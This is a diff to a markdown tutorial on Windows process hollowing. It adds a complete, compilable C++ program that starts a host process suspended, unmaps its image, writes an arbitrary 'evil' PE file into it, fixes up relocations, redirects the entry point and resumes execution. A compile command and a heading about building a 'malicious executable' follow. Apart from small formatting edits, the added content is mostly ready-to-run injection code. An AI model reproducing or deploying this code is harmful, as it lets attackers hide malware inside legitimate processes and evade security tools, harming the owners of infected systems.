@@ -332,7 +332,8 @@ So to implement relocation, we start by checking if BaseOffset is non-zero. Base
 
 I'll break the code to steps,
 
-- **Looking for .reloc section** 
+- **Looking for .reloc section**
+   
 We need to grap the .reloc section to adjust adresses, so looping on the sections find the .reloc.
 Also we calculate the address of each section header using the base address of the image and the size of the headers.
 ```cpp
@@ -344,6 +345,7 @@ for (int i = 0; i < nt_head->FileHeader.NumberOfSections; i++) {
     }
 ```
 - **Setting Relocation data**
+  
 We Retrieve the base address of the relocation section (.reloc) and the size of the relocation data from the optional header of the PE file, and set the initial offset to zero. This offset will be used to navigate through the relocation data.
 ```
     DWORD RelocAddress = sec_head->PointerToRawData;
@@ -352,6 +354,7 @@ We Retrieve the base address of the relocation section (.reloc) and the size of 
 ```
 
 - **.reloc blocks processing**
+  
 In this part i'll talk a little bit about .reloc section architecture in order to be able to proceed.
 The architecture of the .reloc section consists of multiple relocation blocks, each starting with a BASE_RELOCATION_BLOCK structure. This structure contains two main fields: PageAddress, which specifies the base address for the relocations within the block, and BlockSize, which indicates the size of the block including the header and the relocation entries.
 Following the block header, the block contains an array of BASE_RELOCATION_ENTRY structures. Each entry represents a relocation to be performed and consists of a type field and an offset field. The type field specifies the type of relocation ( this is very important to understand ), such as adjusting a 32-bit address, and the offset field specifies the location within the 4KB page where the relocation is to be applied. The program uses these blocks and entries to update the addresses in the PE file ( malicious file ), ensuring that the code and data are correctly positioned in memory regardless of where the program is loaded.
@@ -447,7 +450,245 @@ pContext->Rcx is similarly set to the base address plus the entry point offset, 
 }
 ```
 And finally we can resume the main thread by using ResumeThread(proc_info.hThread).
+### The Full code version 
+```cpp
+#include <stdio.h>
+#include <windows.h>
+#include <string.h>
+#include <winternl.h>
 
+typedef NTSTATUS(WINAPI* _NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
+
+typedef struct BASE_RELOCATION_BLOCK {
+	DWORD PageAddress;
+	DWORD BlockSize;
+} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;
+
+typedef struct BASE_RELOCATION_ENTRY {
+	USHORT Offset : 12;
+	USHORT Type : 4;
+} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;
+
+
+int main(int argc, char *argv[]) {
+
+	if (argc != 3){
+		printf("Usage: Process Hollowing.exe [Host.exe] [Inject]\n");
+		return 0;
+	}
+
+	// Creating Susspended Proccess And Mapping a File To Memory
+	LPSTARTUPINFOA pStartupinfo = new STARTUPINFOA();
+	PROCESS_INFORMATION proc_info;
+	HANDLE HEvilFile;
+
+	printf("Creating Susspended Process. [%s]\n",argv[1]);
+	CreateProcessA(NULL, argv[1], NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, pStartupinfo, &proc_info);
+	HEvilFile = CreateFileA(argv[2], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+
+	DWORD EvilFileSize = GetFileSize(HEvilFile, NULL);
+	PBYTE EvilImage = new BYTE[EvilFileSize];
+
+	printf("Mamming File To Memory. [%s]\n", argv[2]);
+	DWORD readbytes;
+	ReadFile(HEvilFile, EvilImage, EvilFileSize, &readbytes, NULL);
+
+	
+	// Get All The Register Values
+	printf("Geting Current Context.\n");
+	LPCONTEXT pContext = new CONTEXT();
+	pContext->ContextFlags = CONTEXT_FULL;
+	if (!GetThreadContext(proc_info.hThread, pContext)) {
+		printf("Error getting context\n");
+		return 0;
+	}
+	
+
+	// Get The Base Address Of The Susspended Process
+	PVOID BaseAddress;
+
+	#ifdef _X86_ 
+		ReadProcessMemory(proc_info.hProcess, (PVOID)(pContext->Ebx + 8), &BaseAddress, sizeof(PVOID), NULL);
+	#endif
+
+	#ifdef _WIN64
+		ReadProcessMemory(proc_info.hProcess, (PVOID)(pContext->Rdx + (sizeof(SIZE_T) * 2)), &BaseAddress, sizeof(PVOID), NULL);
+	#endif
+
+	// Getting The Addres Of NtUnmapViewOfSection And unmmaping All the Sections
+	printf("Unmapping Section.\n");
+	HMODULE hNTDLL = GetModuleHandleA("ntdll");
+	FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");
+	_NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection) fpNtUnmapViewOfSection;
+	if (NtUnmapViewOfSection(proc_info.hProcess, BaseAddress)) {
+		printf("Error Unmaping Section\n");
+		return 0;
+	}
+
+
+	// Getting The DOS Header And The NT Header Of The Mapped File
+	PIMAGE_DOS_HEADER dos_head = (PIMAGE_DOS_HEADER)EvilImage;
+	PIMAGE_NT_HEADERS nt_head = (PIMAGE_NT_HEADERS)((LPBYTE)EvilImage + dos_head->e_lfanew);
+
+
+	// Allocaation Memory In the Susspended Process;
+	PVOID mem = VirtualAllocEx(proc_info.hProcess, BaseAddress, nt_head->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	#ifdef _X86_
+		// Calculate The Offset Of The Susspended Process Base Address From The Files Base Address
+		DWORD BaseOffset = (DWORD)BaseAddress - nt_head->OptionalHeader.ImageBase;
+		printf("Original Process Base: 0x%llx\nEvil File Base: 0x%llx\nOffset: 0x%llx\n\n", nt_head->OptionalHeader.ImageBase, BaseAddress, BaseOffset);
+
+
+		// Change The Files Base Address To The Base Address Of The Susspended Process
+		nt_head->OptionalHeader.ImageBase = (DWORD)BaseAddress;
+	#endif
+	#ifdef _WIN64
+		// Calculate The Offset Of The Susspended Process Base Address From The Files Base Address
+		DWORD64 BaseOffset = (DWORD64)BaseAddress - nt_head->OptionalHeader.ImageBase;
+		printf("Original Process Base: 0x%llx\nEvil File Base: 0x%llx\nOffset: 0x%llx\n\n", nt_head->OptionalHeader.ImageBase, BaseAddress, BaseOffset);
+
+
+		// Change The Files Base Address To The Base Address Of The Susspended Process
+		nt_head->OptionalHeader.ImageBase = (DWORD64)BaseAddress;
+	#endif
+	// Write The Files Headers To The Allocated Memory In The Susspended Process
+	if(!WriteProcessMemory(proc_info.hProcess, BaseAddress, EvilImage, nt_head->OptionalHeader.SizeOfHeaders, 0)){
+		printf("Failed to write Headers\n");
+		return 0;
+	}
+
+	// Write All The Sections From The Mapped File To the Susspended Process
+	PIMAGE_SECTION_HEADER sec_head;
+
+	printf("Writing Sections:\n");
+	//Loop Over Every Section
+	for ( int i = 0; i < nt_head->FileHeader.NumberOfSections; i++)
+	{
+		// Get The Head Of the Current Section
+		sec_head = (PIMAGE_SECTION_HEADER)((LPBYTE)EvilImage + dos_head->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
+		printf("0x%lx -- Writing Section: %s\n", (LPBYTE)mem + sec_head->VirtualAddress, sec_head->Name);
+		// Write The section From The File In the Allocated Memory
+		if (!WriteProcessMemory(proc_info.hProcess, (PVOID)((LPBYTE)mem + sec_head->VirtualAddress), (PVOID)((LPBYTE)EvilImage + sec_head->PointerToRawData), sec_head->SizeOfRawData, NULL)) {
+			printf("Error Wriring section: %s. At: %x%llp\n", sec_head->Name, (LPBYTE)mem + sec_head->VirtualAddress);
+		}
+	}
+
+	// Check If There Is an Offset Between the Base Addresses
+	if (BaseOffset) {
+
+		printf("\nRelocating The Relocation Table...\n");
+
+		// Loop Over Evey Section
+		for (int i = 0; i < nt_head->FileHeader.NumberOfSections; i++)
+		{
+			// Get The Head Of the Current Section
+			sec_head = (PIMAGE_SECTION_HEADER)((LPBYTE)EvilImage + dos_head->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
+			
+			// Compare The Secction Name To The ".reloc" Section
+			char pSectionName[] = ".reloc";
+			if (memcmp(sec_head->Name, pSectionName, strlen(pSectionName))) {
+				// If The Section Is Not The ".reloc" Section Conntinue To The Next Section
+				continue;
+			}
+
+			// Get The Address Of the Section Data
+			DWORD RelocAddress = sec_head->PointerToRawData;
+			IMAGE_DATA_DIRECTORY RelocData = nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+			DWORD Offset = 0;
+
+			// Iterate Over The Relocation Table
+			while (Offset < RelocData.Size){
+
+				// Get The Head Of The Relocation Block
+				PBASE_RELOCATION_BLOCK pBlockHeader = (PBASE_RELOCATION_BLOCK) &EvilImage[RelocAddress + Offset];
+				printf("\nRelocation Block 0x%x. Size: 0x%x\n", pBlockHeader->PageAddress, pBlockHeader->BlockSize);
+
+				Offset += sizeof(BASE_RELOCATION_BLOCK);
+
+				// Calculate The Entries In the Current Table
+				DWORD EntryCount = (pBlockHeader->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
+				printf("%d Entries Must Be Realocated In The Current Block.\n", EntryCount);
+
+				PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY) &EvilImage[RelocAddress + Offset];
+
+				for (int x = 0; x < EntryCount; x++)
+				{
+					Offset += sizeof(BASE_RELOCATION_ENTRY);
+					
+					// If The Type Of The Enrty Is 0 We Dont Need To Do Anything
+					if (pBlocks[x].Type == 0){
+						printf("The Type Of Base Relocation Is 0. Skipping.\n");
+						continue;
+					}
+
+					// Resolve The Adderss Of The Reloc
+					DWORD FieldAddress = pBlockHeader->PageAddress + pBlocks[x].Offset;
+					
+					#ifdef _X86_
+					// Read The Value In That Address
+					DWORD EnrtyAddress = 0;
+					ReadProcessMemory(proc_info.hProcess, (PVOID)((DWORD)BaseAddress + FieldAddress), &EnrtyAddress, sizeof(PVOID), 0);
+					printf("0x%llx --> 0x%llx | At:0x%llx\n", EnrtyAddress, EnrtyAddress + BaseOffset, (PVOID)((DWORD)BaseAddress + FieldAddress));
+
+					// Add The Correct Offset To That Address And Write It
+					EnrtyAddress += BaseOffset;
+					if (!WriteProcessMemory(proc_info.hProcess, (PVOID)((DWORD)BaseAddress + FieldAddress), &EnrtyAddress, sizeof(PVOID), 0)) {
+						printf("Error Writing Entry.\n");
+					}
+					#endif
+					#ifdef _WIN64
+					// Read The Value In That Address
+					DWORD64 EnrtyAddress = 0;
+					ReadProcessMemory(proc_info.hProcess, (PVOID)((DWORD64)BaseAddress + FieldAddress), &EnrtyAddress, sizeof(PVOID), 0);
+					printf("0x%llx --> 0x%llx | At:0x%llx\n", EnrtyAddress, EnrtyAddress + BaseOffset,(PVOID)((DWORD64)BaseAddress + FieldAddress));
+					
+					// Add The Correct Offset To That Address And Write It
+					EnrtyAddress += BaseOffset;
+					if (!WriteProcessMemory(proc_info.hProcess, (PVOID)((DWORD64)BaseAddress + FieldAddress), &EnrtyAddress, sizeof(PVOID), 0)){
+						printf("Error Writing Entry.\n");
+					}
+					#endif
+				}
+			}
+		}
+	}
+
+	#ifdef _X86_
+		// Write The New Image Base Address
+		WriteProcessMemory(proc_info.hProcess, (PVOID)(pContext->Ebx + 8), &nt_head->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
+
+		// Write The New Entrypoint
+		DWORD EntryPoint = (DWORD)((LPBYTE)mem + nt_head->OptionalHeader.AddressOfEntryPoint);
+		pContext->Eax = EntryPoint;
+	#endif
+	#ifdef _WIN64
+			// Write The New Image Base Address
+			WriteProcessMemory(proc_info.hProcess, (PVOID)(pContext->Rdx + (sizeof(SIZE_T) * 2)), &nt_head->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
+
+			// Write The New Entrypoint
+			DWORD64 EntryPoint = (DWORD64)((LPBYTE)mem + nt_head->OptionalHeader.AddressOfEntryPoint);
+			pContext->Rcx = EntryPoint;
+	#endif
+
+	printf("\nSetting Thread Context.\n");
+	if (!SetThreadContext(proc_info.hThread, pContext)){
+		printf("Error setting context\n");
+		return 0;
+	}
+
+	printf("Resuming Thread.\n");
+	if (!ResumeThread(proc_info.hThread)){
+		printf("Error resuming thread\n");
+		return 0;
+	}
+
+
+	printf("\nDone. Enjoy The \"New\" Process.\n---------------------------------\n\n");
+	return 0;
+}
+```
+
+In order to use it, we should compile it using ```g++ ProcessHollowing.cpp -o ProcessHollowing.exe -```
 ## Creating malicious executable
 
 In this part, We will create a HelloWorld executable that show a message box.
